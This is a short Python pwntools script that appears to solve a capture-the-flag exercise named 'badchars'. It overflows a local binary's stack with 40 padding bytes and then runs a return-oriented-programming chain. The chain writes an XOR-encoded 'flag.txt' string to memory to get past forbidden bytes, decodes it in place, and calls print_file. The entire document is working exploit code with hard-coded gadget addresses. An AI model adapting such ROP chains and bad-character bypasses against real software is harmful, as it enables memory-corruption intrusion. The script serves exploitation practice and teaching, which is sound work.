from pwn import *

r = process("./badchars")
#gdb.attach(r, api = True)

pop_r12_r13_r14_r15 = 0x000000000040069c
mov_r13add_r12 = 0x0000000000400634

pop_r14_r15 = 0x00000000004006a0
xor_r15add_r14 = 0x0000000000400628

ret = 0x00000000004004ee

address_flagtxt = 0x601040
pop_rdi = 0x00000000004006a3
print_file = 0x00400510

#bypass badchars
flag = (''.join(chr(ord(c) ^ 2) for c in "flag.txt")).encode('utf-8')

payload = b'A'*40 + p64(ret)

payload += p64(pop_r12_r13_r14_r15)
payload += flag + p64(address_flagtxt) + p64(1) + p64(1)
payload += p64(mov_r13add_r12)

for i in range(8):
    payload += p64(pop_r14_r15)
    payload += p64(2) + p64(address_flagtxt + i)
    payload += p64(xor_r15add_r14)

payload += p64(pop_rdi)
payload += p64(address_flagtxt)
payload += p64(print_file)


r.sendline(payload)
r.interactive()